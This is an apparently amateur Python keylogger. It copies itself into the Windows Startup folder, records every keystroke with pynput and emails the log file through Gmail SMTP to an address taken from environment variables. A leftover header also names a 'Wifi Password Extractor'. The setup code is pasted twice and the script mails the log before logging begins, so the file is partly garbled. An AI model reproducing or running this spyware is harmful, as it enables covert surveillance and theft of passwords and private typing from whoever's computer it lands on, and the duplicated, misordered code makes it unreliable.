import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

# config for getting secrets from env
import os
from dotenv import load_dotenv

load_dotenv()
# config ends

# cauz i am using gmail
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()

server.ehlo()

server.login(os.getenv("Email"), os.getenv("Password"))

msg = MIMEMultipart()
msg["From"] = "Your Wifi Password Extractor"
msg["To"] = "Mohammed Mubashir Hasan"
msg["Subject"] = "Wifi Passwords"

# config for getting secrets from env
import os
from dotenv import load_dotenv

load_dotenv()
# config ends

# cauz i am using gmail
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()

server.ehlo()

server.login(os.getenv("Email"), os.getenv("Password"))

msg = MIMEMultipart()
msg["From"] = "Your realLogger"
msg["To"] = "Mohammed Mubashir Hasan"
msg["Subject"] = "New key strokes"

# now back to the keylogger
from pynput.keyboard import Listener
import logging
from shutil import copyfile

username = os.getlogin()

copyfile('main.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.py')

logging.basicConfig(filename="log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

with open("log.txt", "r") as f:
    secret = f.read()
    msg.attach(MIMEText(secret, "plain"))

# sending reports


text = msg.as_string()

server.sendmail(os.getenv("Email"), os.getenv("SendEmail"), text)


# back to keylogging

def key_handler(key):
    k = str(key).replace("'", "")
    logging.info(k)


with Listener(on_press=key_handler)as listener:
    listener.join()